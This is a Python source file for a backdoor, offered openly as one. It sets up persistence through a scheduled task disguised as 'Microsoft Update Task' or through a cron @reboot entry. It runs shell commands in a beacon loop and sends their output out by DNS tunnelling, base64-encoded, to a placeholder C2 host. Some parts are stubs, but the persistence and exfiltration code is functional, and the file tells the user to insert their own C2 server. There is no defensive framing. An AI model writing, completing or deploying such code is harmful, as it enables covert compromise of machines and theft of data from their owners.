import os
import socket
import subprocess
import time
import base64

class Backdoor:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.process_name = "system_update_service"
        self.persistence_name = "Microsoft Update Task"

    def disguise_process(self):
        """Disguises the process name."""
        try:
            # This is a placeholder for a more sophisticated method
            # On Linux, you might use ctypes to call prctl
            # On Windows, you might use ctypes to call SetConsoleTitleW
            pass
        except Exception as e:
            print(f"Error disguising process: {e}")

    def establish_persistence(self):
        """Establishes persistence using a scheduled task."""
        try:
            script_path = os.path.abspath(__file__)
            if os.name == 'nt':
                command = f'schtasks /create /tn "{self.persistence_name}" /tr "python {script_path}" /sc onlogon /rl highest /f'
            else:
                # Using cron for persistence on Linux/macOS
                command = f'(crontab -l 2>/dev/null; echo "@reboot python {script_path}") | crontab -'
            subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("Persistence established.")
        except Exception as e:
            print(f"Error establishing persistence: {e}")

    def dns_tunnel(self, data):
        """Sends data to the C2 server using DNS tunneling."""
        try:
            encoded_data = base64.b64encode(data.encode()).decode()
            # This is a simplified simulation of DNS tunneling
            # In a real scenario, you would craft DNS queries to a server you control
            query = f"{encoded_data}.{self.c2_host}"
            socket.gethostbyname(query)
        except Exception as e:
            print(f"DNS tunneling error: {e}")

    def run(self):
        """Runs the backdoor."""
        self.disguise_process()
        self.establish_persistence()

        while True:
            try:
                # Simulate receiving a command from the C2 server
                command_to_execute = "hostname" # Placeholder for a real command
                
                # Execute the command
                result = subprocess.run(command_to_execute, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = result.stdout.decode() + result.stderr.decode()

                # Exfiltrate the output
                self.dns_tunnel(output)
                
                time.sleep(60) # Beacon interval
            except Exception as e:
                print(f"Error in main loop: {e}")
                time.sleep(60)

if __name__ == "__main__":
    # Replace with your actual C2 server
    c2_host = "your-c2-server.com"
    c2_port = 53

    backdoor = Backdoor(c2_host, c2_port)
    backdoor.run()
